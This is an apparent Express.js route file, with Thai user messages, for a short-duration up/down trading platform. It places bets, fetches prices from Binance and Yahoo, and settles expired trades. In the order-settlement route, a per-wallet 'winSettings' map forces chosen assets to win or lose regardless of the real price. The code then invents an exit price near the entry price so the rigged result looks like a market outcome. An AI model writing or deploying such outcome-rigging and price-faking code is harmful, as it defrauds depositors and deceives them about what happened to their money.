
const express = require("express");
const router = express.Router();
const Trade = require("../models/Trade");
const Wallet = require("../models/Wallet");
const User = require("../models/User");
const axios = require("axios");
const authenticate = require("../middleware/authenticate");

const config = {
  2: { min: 100, profitPercent: 6 },
  5: { min: 3000, profitPercent: 9 },
  15: { min: 7000, profitPercent: 11 },
  30: { min: 24000, profitPercent: 14 },
  60: { min: 73000, profitPercent: 17 },
};

const isCrypto = (symbol) => {
  const binanceAssets = [
    "BTCUSDT", "ETHUSDT", "BNBUSDT", "SOLUSDT", "XRPUSDT",
    "ADAUSDT", "DOGEUSDT", "DOTUSDT", "AVAXUSDT", "SHIBUSDT"
  ];
  return binanceAssets.includes(symbol.toUpperCase());
};

const getCurrentPrice = async (asset) => {
  try {
    if (isCrypto(asset)) {
      const res = await axios.get(`https://api.binance.com/api/v3/ticker/price?symbol=${asset}`);
      return parseFloat(res.data.price);
    } else {
      const specialMap = {
        "XAUUSD": "GC=F",
        "XAGUSD": "SI=F",
        "PLATINUM": "PL=F",
        "COPPER": "HG=F",
        "EURUSD": "EURUSD=X",
        "GBPUSD": "GBPUSD=X",
        "USDJPY": "USDJPY=X",
        "AUDUSD": "AUDUSD=X",
        "NZDUSD": "NZDUSD=X",
        "USDCHF": "USDCHF=X"
      };
      const symbol = specialMap[asset.toUpperCase()] || asset;
      const url = `https://query1.finance.yahoo.com/v8/finance/chart/${symbol}`;
      const res = await axios.get(url);
      const price = res.data.chart?.result?.[0]?.meta?.regularMarketPrice;
      if (!price) throw new Error(`ไม่มีราคาสำหรับ ${symbol}`);
      return parseFloat(price);
    }
  } catch (err) {
    console.error("❌ ดึงราคาล้มเหลว:", err.message);
    return null;
  }
};

router.post("/place-order", authenticate, async (req, res) => {
  try {
    const userId = req.user.id;
    const { asset, amount, direction, timeframe } = req.body;
    const amountNum = parseFloat(amount);
    const tf = config[timeframe];
    if (!tf) return res.status(400).json({ message: "โหมดเวลาไม่ถูกต้อง" });
    if (amountNum < tf.min) return res.status(400).json({ message: `ขั้นต่ำคือ ${tf.min} USDT` });

    const wallet = await Wallet.findOne({ userId });
    if (!wallet || wallet.balance < amountNum)
      return res.status(400).json({ message: "ยอดเงินไม่เพียงพอ" });

    const entryPrice = await getCurrentPrice(asset);
    if (!entryPrice)
      return res.status(500).json({ message: "ไม่สามารถดึงราคาได้ กรุณาลองใหม่" });

    const expireAt = new Date(Date.now() + timeframe * 60000);
    wallet.balance -= amountNum;
    await wallet.save();
    req.io.emit("orderUpdated");

    const trade = await Trade.create({
      userId,
      asset,
      amount: amountNum,
      direction,
      timeframe,
      entryPrice,
      expireAt,
      status: "open",
    });

    req.io.emit("orderUpdated");
    return res.json({ message: "เปิดออเดอร์สำเร็จ", trade });
  } catch (err) {
    console.error("❌ place-order error:", err);
    res.status(500).json({ message: "เกิดข้อผิดพลาดในการเปิดออเดอร์" });
  }
});

// แทนที่ส่วนนี้ใน route: GET /api/trade/orders
router.get("/orders", authenticate, async (req, res) => {
  try {
    const userId = req.user.id;
    const now = new Date();

    const wallet = await Wallet.findOne({ userId });
    const trades = await Trade.find({ userId }).sort({ createdAt: -1 });
    const winAssets = wallet.winSettings || {};

    for (let trade of trades) {
      if (trade.status === "open" && trade.expireAt <= now) {
        const tf = config[trade.timeframe];
        const percent = tf.profitPercent / 100;
        const reward = trade.amount * percent;

        const realPrice = await getCurrentPrice(trade.asset);
        if (!realPrice) continue;

        const assetKey = trade.asset.toUpperCase(); // ✅ ใช้ชื่อเต็ม เช่น "BTCUSDT"
        const forceWin = winAssets[assetKey] === "win";
        const forceLose = winAssets[assetKey] === "lose";

        const win = forceWin
          ? true
          : forceLose
            ? false
            : (trade.direction === "buy"
              ? realPrice > trade.entryPrice
              : realPrice < trade.entryPrice);

        let exitPrice = realPrice;
        if (forceWin) {
          exitPrice = trade.direction === "buy"
            ? trade.entryPrice + Math.random() * (trade.entryPrice * 0.001)
            : trade.entryPrice - Math.random() * (trade.entryPrice * 0.001);
        } else if (forceLose) {
          exitPrice = trade.direction === "buy"
            ? trade.entryPrice - Math.random() * (trade.entryPrice * 0.001)
            : trade.entryPrice + Math.random() * (trade.entryPrice * 0.001);
        }

        trade.status = "closed";
        trade.result = win ? "win" : "lose";
        trade.exitPrice = parseFloat(exitPrice.toFixed(4));
        trade.closedAt = now;
        trade.profit = win ? reward : -reward;
        await trade.save();

        wallet.balance += win ? trade.amount + reward : trade.amount - reward;
        await wallet.save();

        req.io.emit("balanceUpdated", { userId });
      }
    }

    const updatedTrades = await Trade.find({ userId }).sort({ createdAt: -1 });
    res.json(updatedTrades);
  } catch (err) {
    console.error("❌ ดึงข้อมูลออเดอร์ล้มเหลว:", err.message);
    res.status(500).json({ message: "เกิดข้อผิดพลาด" });
  }
});



router.get("/order/:id", authenticate, async (req, res) => {
  try {
    const userId = req.user.id;
    const order = await Trade.findOne({ _id: req.params.id, userId });
    if (!order) return res.status(404).json({ message: "ไม่พบออเดอร์" });
    res.json(order);
  } catch (err) {
    console.error("❌ ดึงออเดอร์เดี่ยวล้มเหลว:", err);
    res.status(500).json({ message: "เกิดข้อผิดพลาด" });
  }
});

module.exports = router;
